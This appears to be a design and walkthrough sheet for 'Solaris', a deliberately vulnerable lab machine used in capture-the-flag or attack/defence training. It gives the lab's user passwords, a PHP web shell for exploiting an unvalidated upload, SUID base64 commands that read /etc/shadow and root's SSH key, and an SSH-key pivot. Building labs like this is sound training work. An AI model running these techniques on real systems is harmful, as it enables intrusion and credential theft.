# Solaris

> Solaris is an old file sharing server. It represents reliability, stability, warmth, and a touch of nostalgia of what used to be.

---

## Overview

| Property | Value |
|----------|-------|
| Difficulty | Easy |
| Services | SSH, SMB, HTTP |
| Initial Access | SMB Anonymous Share, Arbitrary File Upload |
| Privilege Escalation | SUID base64 Binary |
| Lateral Movement | SSH Keys → starfall |

---

## Users

| Username | Password |
|----------|----------|
| solaris | solar-paneL321 |
| ops | 9ksP311p |
| root | Ag9G61RF |

---

## Services

### OpenSSH Server
- Standard SSH service for remote access
- Password authentication enabled

### Samba SMB (Anonymous Share)
- Anonymous/guest access enabled
- Share path: `/srv/samba/public`
- Contains `backup.zip` with user credentials

### Apache + PHP Website
- Basic file storage website
- Vulnerable file upload functionality (no validation)
- Upload directory: `/var/www/html/uploads/`

---

## Attack Vectors

### Initial Access

#### Option 1: SMB Anonymous Share
1. Enumerate SMB shares:
   ```bash
   smbclient -L //<target_ip>/ -N
   ```
2. Connect to public share:
   ```bash
   smbclient //<target_ip>/public -N
   ```
3. Download `backup.zip`:
   ```bash
   get backup.zip
   ```
4. Extract and read credentials:
   ```bash
   unzip backup.zip
   cat credentials.txt
   ```
5. SSH as solaris user:
   ```bash
   ssh solaris@<target_ip>
   ```

#### Option 2: Arbitrary File Upload
1. Navigate to web application at `http://<target_ip>/`
2. Create a PHP reverse shell:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Upload the PHP file (no extension filtering)
4. Access shell at `http://<target_ip>/uploads/shell.php?cmd=id`
5. Establish reverse shell for full access

### Privilege Escalation

#### SUID base64 Binary
The `/usr/bin/base64` binary has the SUID bit set (misconfiguration by previous sysadmin).

1. Find SUID binaries:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
2. Read sensitive files using base64:
   ```bash
   base64 /etc/shadow | base64 -d
   base64 /root/ctrl.txt | base64 -d
   ```
3. Read root's SSH key (if exists):
   ```bash
   base64 /root/.ssh/id_rsa | base64 -d
   ```

**GTFOBins Reference:** https://gtfobins.github.io/gtfobins/base64/


#### Cronjob

A scheduled task runs every 5 minutes:

| Schedule | Script | Purpose |
|----------|--------|---------|
| */5 * * * * | /usr/local/bin/solaris-report.sh | Base64 encodes last 10 auth.log lines |

**Script location:** `/usr/local/bin/solaris-report.sh`  
**Output file:** `/var/log/auth-store.log`

---

### Lateral Movement

#### SSH Keys → starfall
1. As the solaris user, check for SSH keys:
   ```bash
   ls -la /home/solaris/.ssh/
   cat /home/solaris/.ssh/readme.txt
   ```
2. Use the private key to connect to starfall:
   ```bash
   ssh -i /home/solaris/.ssh/id_rsa solaris@starfall
   ```

---

## Scoring

### Services
- [ ] Website (Apache/PHP)
- [ ] SSH (OpenSSH)
- [ ] SMB (Samba)

### Control Files
- [ ] `/root/ctrl.txt`
- [ ] `/home/solaris/ctrl.txt`
- [ ] `/var/www/html/ctrl.txt`

---

## File Locations

| Purpose | Path |
|---------|------|
| SMB Share | /srv/samba/public |
| Web Root | /var/www/html |
| Upload Directory | /var/www/html/uploads |
| Report Script | /usr/local/bin/solaris-report.sh |
| Auth Store Log | /var/log/auth-store.log |
| Solaris SSH Keys | /home/solaris/.ssh/ |
| Samba Config | /etc/samba/smb.conf |